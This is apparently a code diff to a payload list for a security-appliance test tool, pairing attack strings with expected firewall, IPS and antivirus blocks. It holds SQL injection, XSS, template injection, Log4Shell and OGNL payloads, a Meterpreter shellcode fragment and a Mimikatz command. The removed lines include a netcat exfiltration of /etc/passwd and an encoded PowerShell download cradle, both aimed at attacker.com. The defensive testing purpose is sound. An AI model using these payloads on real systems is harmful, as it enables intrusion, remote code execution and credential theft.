@@ -4,313 +4,281 @@ import { TestPayload, TestCategory } from './types';
 export const TEST_PAYLOADS: TestPayload[] = [
   // --- WAF (Web Application Firewall) ---
   {
-    id: 'waf-sqli-01',
+    id: 'waf-sqli-tautology',
     name: 'WAF: SQLi Tautology',
     description: 'Classic auth bypass using "OR 1=1". Tests basic SQL injection signatures.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
     content: "' OR 1=1 --",
-    expectedBehavior: '403 Forbidden / SQLi Signature Match'
+    expectedBehavior: '403 Forbidden / 406 Not Acceptable'
   },
   {
-    id: 'waf-sqli-sleep',
-    name: 'WAF: Blind SQLi (Time-based)',
-    description: 'Attempts to use pg_sleep or SLEEP() functions to detect database response lag.',
+    id: 'waf-sqli-union-all',
+    name: 'WAF: UNION SELECT Leak',
+    description: 'Attempts to join and leak data from the information_schema.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "'; SELECT pg_sleep(5); --",
-    expectedBehavior: 'Time-based SQLi Detection'
+    content: "' UNION ALL SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
+    expectedBehavior: 'SQLi Schema Access Block'
   },
   {
-    id: 'waf-xss-01',
-    name: 'WAF: Reflected XSS',
-    description: 'Standard <script> injection. Tests cross-site scripting filters.',
+    id: 'waf-sqli-blind-sleep',
+    name: 'WAF: Blind SQLi (Sleep)',
+    description: 'Time-based blind SQL injection using conditional sleep functions.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "<script>alert('SENTINELA_XSS')</script>",
-    expectedBehavior: 'XSS Filter Block'
+    content: "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
+    expectedBehavior: 'Time-based Injection Filter'
   },
   {
-    id: 'waf-xss-img',
-    name: 'WAF: Attribute-based XSS',
-    description: 'XSS attempt via onerror attribute in an <img> tag.',
+    id: 'waf-xss-svg-event',
+    name: 'WAF: SVG Event XSS',
+    description: 'XSS attempt via SVG onload event to bypass basic HTML tag filters.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "<img src=x onerror=alert(1)>",
-    expectedBehavior: 'Attribute-based XSS Detection'
+    content: "<svg/onload=alert('SENTINELA')>",
+    expectedBehavior: 'XSS/SVG Filter Match'
   },
   {
-    id: 'waf-rfi-01',
-    name: 'WAF: Remote File Inclusion',
-    description: 'Attempts to force the server to load a remote script from an external URL.',
+    id: 'waf-xss-polyglot-min',
+    name: 'WAF: XSS Polyglot',
+    description: 'A compact polyglot payload that executes in multiple HTML contexts.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "http://attacker.com/malicious_shell.txt",
-    expectedBehavior: 'RFI/URL Filtering Block'
+    content: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(alert(1))//'>",
+    expectedBehavior: 'Advanced XSS Filter Block'
   },
   {
     id: 'waf-lfi-passwd',
-    name: 'WAF: LFI Path Traversal',
-    description: 'Attempts to read /etc/passwd using directory traversal sequences.',
+    name: 'WAF: LFI /etc/passwd',
+    description: 'Local File Inclusion attempt targeting sensitive Linux system files.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "../../../../../../../../etc/passwd",
-    expectedBehavior: 'LFI / Path Traversal Signature'
+    content: "../../../../etc/passwd",
+    expectedBehavior: 'Path Traversal Block'
   },
   {
-    id: 'waf-xxe-01',
-    name: 'WAF: XML External Entity (XXE)',
-    description: 'Simulates a malicious XML payload attempting to read system files via entities.',
+    id: 'waf-ssti-handlebars',
+    name: 'WAF: Handlebars SSTI',
+    description: 'Template injection for code execution on Handlebars-based backends.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
-    expectedBehavior: 'XXE Injection Protection'
+    content: "{{#with 'test' as |t|}}{{#with (t.split 'a') as |s|}}{{s.constructor.constructor('alert(1)')()}}{{/with}}{{/with}}",
+    expectedBehavior: 'SSTI Detection'
   },
   {
-    id: 'waf-ssti-01',
-    name: 'WAF: Template Injection (SSTI)',
-    description: 'Attempts to execute code via Jinja2/Mako template syntax.',
+    id: 'waf-graphql-dos',
+    name: 'WAF: GraphQL Introspection',
+    description: 'Attempts to map the entire GraphQL schema via introspection query.',
     category: TestCategory.WAF,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "{{7*7}} ${7*7} <%= 7*7 %>",
-    expectedBehavior: 'SSTI Signature Match'
-  },
-  {
-    id: 'waf-nosqli-01',
-    name: 'WAF: NoSQL Injection',
-    description: 'Attempts to bypass MongoDB queries using $gt (greater than) operators.',
-    category: TestCategory.WAF,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
-    expectedBehavior: 'NoSQL Operator Filtering'
+    content: "query { __schema { types { name fields { name } } } }",
+    expectedBehavior: 'GraphQL Policy Block'
   },
 
-  // --- IPS (Intrusion Prevention System) ---
+  // --- IPS (Intrusion Prevention) ---
   {
-    id: 'ips-shellshock',
-    name: 'IPS: Shellshock (CVE-2014-6271)',
-    description: 'Bash environment variable manipulation exploit signature.',
-    category: TestCategory.IPS,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: "() { :;}; /bin/bash -c 'whoami'",
-    expectedBehavior: 'Shellshock Signature Match'
-  },
-  {
-    id: 'ips-cmd-inj',
-    name: 'IPS: Command Injection (Piping)',
-    description: 'Attempts to chain system commands using semicolons and pipes.',
-    category: TestCategory.IPS,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: "; cat /etc/passwd | nc attacker.com 4444",
-    expectedBehavior: 'OS Command Injection Detection'
-  },
-  {
-    id: 'ips-log4shell',
+    id: 'ips-log4shell-jndi',
     name: 'IPS: Log4Shell (CVE-2021-44228)',
-    description: 'Detection of JNDI LDAP lookup patterns used in Log4j exploits.',
+    description: 'Critical RCE signature using JNDI lookup patterns.',
     category: TestCategory.IPS,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "${jndi:ldap://attacker.io/a}",
-    expectedBehavior: 'Log4J Exploit Block'
+    content: "${jndi:ldap://sentinela-audit.com/a}",
+    expectedBehavior: 'IPS/Log4j Signature Match'
   },
   {
     id: 'ips-spring4shell',
     name: 'IPS: Spring4Shell (CVE-2022-22965)',
-    description: 'Detection of ClassLoader manipulation patterns in Java Spring applications.',
+    description: 'ClassLoader manipulation pattern for Spring Framework RCE.',
     category: TestCategory.IPS,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{payload}i",
-    expectedBehavior: 'Spring4Shell Signature Block'
+    content: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25",
+    expectedBehavior: 'Critical RCE Block'
   },
   {
-    id: 'ips-struts2-rce',
-    name: 'IPS: Apache Struts2 RCE',
-    description: 'Simulates the OGNL injection pattern used in high-profile Struts exploits.',
+    id: 'ips-fortigate-rce',
+    name: 'IPS: FortiGate RCE (CVE-2023-27997)',
+    description: 'Detection of exploit patterns targeting FortiOS SSL-VPN vulnerabilities.',
     category: TestCategory.IPS,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
-    expectedBehavior: 'Struts2 OGNL Injection Signature'
+    content: "POST /remote/logincheck HTTP/1.1\r\nEncrypted-Payload: ...",
+    expectedBehavior: 'CVE Specific Signature'
   },
   {
-    id: 'ips-php-fpm-rce',
-    name: 'IPS: PHP-FPM RCE (CVE-2019-11043)',
-    description: 'Detects the specific URL patterns used to exploit PHP-FPM and Nginx.',
+    id: 'ips-f5-icontrol',
+    name: 'IPS: F5 iControl REST RCE',
+    description: 'Detection of exploit patterns for CVE-2022-1388.',
     category: TestCategory.IPS,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "index.php?a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&b=BBBBBBBBBBBBBBBBBB",
-    expectedBehavior: 'PHP-FPM Exploit Pattern'
+    content: "X-F5-Auth-Token: a, Connection: X-F5-Auth-Token",
+    expectedBehavior: 'F5 Exploit Block'
+  },
+  {
+    id: 'ips-confluence-ognl',
+    name: 'IPS: Confluence OGNL Injection',
+    description: 'Targeting CVE-2022-26134 for remote code execution on Atlassian systems.',
+    category: TestCategory.IPS,
+    type: 'network',
+    targetDevice: 'NGFW',
+    content: "/%24%7B%28%23a%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Test%22%2C%22pwned%22%29%29%7D/",
+    expectedBehavior: 'OGNL RCE Match'
   },
 
-  // --- AV (Anti-Virus / Malware) ---
+  // --- MALWARE & VIRUS (Gateway AV) ---
   {
     id: 'av-eicar-std',
-    name: 'AV: EICAR Standard',
-    description: 'Standardized non-viral anti-virus test string.',
+    name: 'Malware: EICAR Standard',
+    description: 'Industry standard non-viral test string. Basic signature detection.',
     category: TestCategory.VIRUS,
-    type: 'download',
-    targetDevice: 'BOTH',
+    type: 'network',
+    targetDevice: 'NGFW',
     content: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
-    expectedBehavior: 'Gateway AV Block'
+    expectedBehavior: 'Gateway AV Interception'
   },
   {
-    id: 'av-gtube-spam',
-    name: 'AV: GTUBE Anti-Spam',
-    description: 'Generic Test for Unsolicited Bulk Email (GTUBE) string.',
-    category: TestCategory.VIRUS,
+    id: 'av-sliver-c2-beacon',
+    name: 'Malware: Sliver C2 Beacon',
+    description: 'Identification of Sliver C2 framework HTTP/2 heartbeat pattern.',
+    category: TestCategory.MALWARE,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X",
-    expectedBehavior: 'Anti-Spam Filter Match'
+    content: "GET /php_session_id.php HTTP/1.1\r\nCookie: session=... (Sliver Pattern)",
+    expectedBehavior: 'C2 Traffic Match'
   },
   {
-    id: 'av-ransom-header',
-    name: 'AV: WannaCry Header Mimic',
-    description: 'Simulates the file signature (header) of the WannaCry ransomware.',
-    category: TestCategory.VIRUS,
-    type: 'download',
-    targetDevice: 'BOTH',
-    content: "WANACRY! [Encrypted Data Simulation Header]",
-    expectedBehavior: 'Known Ransomware Signature'
-  },
-  {
-    id: 'av-ps-empire',
-    name: 'AV: PowerShell Empire Payload',
-    description: 'Detects encoded PowerShell commands used by Empire post-exploitation frameworks.',
-    category: TestCategory.VIRUS,
+    id: 'av-cobalt-stager',
+    name: 'Malware: Cobalt Strike Stager',
+    description: 'Detection of the specific checksum-calculated URI for Cobalt Strike stagers.',
+    category: TestCategory.MALWARE,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "powershell -noP -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAgACcAaAB0AHQAcAA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAGEAJwAgACkAOwA=",
-    expectedBehavior: 'Encoded PowerShell Malicious Script'
+    content: "GET /ab2g HTTP/1.1\r\nHost: c2-sentinela.xyz",
+    expectedBehavior: 'Beacon Stager Block'
+  },
+  {
+    id: 'av-meterpreter-shellcode',
+    name: 'Malware: Meterpreter Reverse Shell',
+    description: 'Detection of raw x64 reverse TCP shellcode in the request body.',
+    category: TestCategory.MALWARE,
+    type: 'network',
+    targetDevice: 'NGFW',
+    content: "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2",
+    expectedBehavior: 'Shellcode Signature Block'
+  },
+  {
+    id: 'av-ransom-locky-dga',
+    name: 'Ransomware: Locky DGA Mimic',
+    description: 'Simulates the algorithmic domain requests used by Locky ransomware.',
+    category: TestCategory.RANSOMWARE,
+    type: 'network',
+    targetDevice: 'NGFW',
+    content: "GET /index.php?id=928374829374928374 HTTP/1.1",
+    expectedBehavior: 'DGA Domain Block'
+  },
+  {
+    id: 'av-mimikatz-sekurlsa',
+    name: 'Malware: Mimikatz Memory Dump',
+    description: 'Signature for Mimikatz "sekurlsa::minidump" commands.',
+    category: TestCategory.MALWARE,
+    type: 'network',
+    targetDevice: 'NGFW',
+    content: "sekurlsa::logonpasswords lsass.exe",
+    expectedBehavior: 'Post-Exploit Tool Block'
   },
 
-  // --- DLP (Data Loss Prevention / Exfil) ---
+  // --- BOT & AUTOMATION ---
   {
-    id: 'dlp-cc-visa',
-    name: 'DLP: Credit Card Exfil (Visa)',
-    description: 'Attempts to exfiltrate valid-formatted Visa credit card numbers.',
-    category: TestCategory.EXFIL,
+    id: 'bot-headless-fingerprint',
+    name: 'Bot: Headless Chrome Scanner',
+    description: 'Identifies Headless Chrome user-agents used by automated scrapers.',
+    category: TestCategory.BOT,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "Customer Records: 4539 1234 5678 9012, 4539 0000 1111 2222",
-    expectedBehavior: 'DLP Sensitive Data Filtering (Luhn Match)'
+    content: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/114.0.0.0 Safari/537.36",
+    expectedBehavior: 'Bot Management Challenge'
   },
   {
-    id: 'dlp-cc-amex',
-    name: 'DLP: Credit Card Exfil (Amex)',
-    description: 'Attempts to exfiltrate valid-formatted American Express numbers.',
-    category: TestCategory.EXFIL,
+    id: 'bot-sqlmap-scan',
+    name: 'Bot: sqlmap Signature',
+    description: 'Identifying the default behavior of the sqlmap vulnerability scanner.',
+    category: TestCategory.BOT,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "Amex ID: 3782 822463 10005, 3712 345678 95006",
-    expectedBehavior: 'DLP Sensitive Data Filtering'
+    content: "User-Agent: sqlmap/1.7.5#stable (https://sqlmap.org)",
+    expectedBehavior: 'Security Tool Block'
   },
   {
-    id: 'dlp-ssn-leak',
-    name: 'DLP: PII/SSN Leak',
-    description: 'Detects the exfiltration of Social Security Numbers.',
-    category: TestCategory.EXFIL,
+    id: 'bot-burp-collaborator',
+    name: 'Bot: Burp OOB Interaction',
+    description: 'Attempts to reach out to Burp Collaborator domains for verification.',
+    category: TestCategory.BOT,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "Employee List: 000-12-3456, 999-00-1111, 123-45-6789",
-    expectedBehavior: 'PII Protection Policy'
+    content: "http://q3v9...burpcollaborator.net",
+    expectedBehavior: 'OOB Domain Block'
   },
   {
-    id: 'dlp-aws-key',
-    name: 'DLP: AWS Secret Key Exfil',
-    description: 'Detects the exfiltration of AWS secret access keys.',
-    category: TestCategory.EXFIL,
+    id: 'bot-cred-stuffing',
+    name: 'Bot: Credential Stuffing',
+    description: 'Simulates high-velocity automated login attempts.',
+    category: TestCategory.BOT,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
-    expectedBehavior: 'Secret/Credential Leak Detection'
-  },
-
-  // --- API & BOT SECURITY ---
-  {
-    id: 'api-broken-auth',
-    name: 'API: Broken Object Level Auth',
-    description: 'Attempts to manipulate API paths to access privileged resources.',
-    category: TestCategory.API,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: "/api/v1/users/admin/export?format=json&force=true",
-    expectedBehavior: 'API Access Control / Path Filtering'
-  },
-  {
-    id: 'api-graphql-intro',
-    name: 'API: GraphQL Introspection',
-    description: 'Attempts to dump the GraphQL schema to discover hidden fields.',
-    category: TestCategory.API,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: "{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}",
-    expectedBehavior: 'GraphQL Schema Protection'
-  },
-  {
-    id: 'bot-sqlmap',
-    name: 'Bot: SQLMap Discovery',
-    description: 'Identifies the signature User-Agent of the sqlmap automated tool.',
-    category: TestCategory.EVASION,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: "User-Agent: sqlmap/1.5.2#stable (http://sqlmap.org)",
-    expectedBehavior: 'Bot Detection / Tool Fingerprinting'
-  },
-  {
-    id: 'bot-burp',
-    name: 'Bot: Burp Suite Collaborator',
-    description: 'Identifies requests attempting to reach Burp Collaborator domains.',
-    category: TestCategory.EVASION,
-    type: 'network',
-    targetDevice: 'NGFW',
-    content: "burpcollaborator.net",
-    expectedBehavior: 'Known Burp Collaborator Domain Block'
+    content: "POST /api/v1/login { \"user\": \"admin\", \"pass\": \"123456\" }",
+    expectedBehavior: 'Rate Limit / Bot Challenge'
   },
 
-  // --- EVASION TECHNIQUES ---
+  // --- EVASION & EXFIL ---
   {
-    id: 'evasion-double-enc',
+    id: 'evasion-double-url',
     name: 'Evasion: Double URL Encoding',
-    description: 'Tests if the NGFW decodes multiple layers of URL encoding for LFI.',
+    description: 'Testing if the security stack decodes multiple layers of encoding.',
     category: TestCategory.EVASION,
     type: 'network',
     targetDevice: 'NGFW',
     content: "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
-    expectedBehavior: 'Double Encoding Normalization'
+    expectedBehavior: 'Recursive Decoding Block'
   },
   {
-    id: 'evasion-hex-sqli',
-    name: 'Evasion: Hex Encoded SQLi',
-    description: 'SQLi attempt encoded in hex format to bypass string matching.',
+    id: 'evasion-null-poison',
+    name: 'Evasion: Null Byte Poisoning',
+    description: 'Using %00 to truncate strings in path/file checks.',
     category: TestCategory.EVASION,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "0x27204F5220313D31",
-    expectedBehavior: 'Hex Decoding & Inspection'
+    content: "malicious.php%00.jpg",
+    expectedBehavior: 'Normalization Filter Match'
   },
   {
-    id: 'evasion-null-byte',
-    name: 'Evasion: Null Byte Injection',
-    description: 'Attempts to truncate string checks using null characters (%00).',
-    category: TestCategory.EVASION,
+    id: 'dlp-cc-visa',
+    name: 'DLP: Credit Card Leak',
+    description: 'Exfiltrating multiple Visa card numbers to test DLP identifiers.',
+    category: TestCategory.EXFIL,
     type: 'network',
     targetDevice: 'NGFW',
-    content: "/etc/passwd%00.jpg",
-    expectedBehavior: 'Input Sanitization / Null Byte Block'
+    content: "Records: 4539 0101 0202 0303, 4539 1234 5678 9012",
+    expectedBehavior: 'DLP PII Block'
+  },
+  {
+    id: 'dlp-aws-secret',
+    name: 'DLP: AWS Secret Key Leak',
+    description: 'Detects the exfiltration of AWS Secret Access Keys in plain text.',
+    category: TestCategory.EXFIL,
+    type: 'network',
+    targetDevice: 'NGFW',
+    content: "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+    expectedBehavior: 'Credential Leak Detection'
   }
 ];
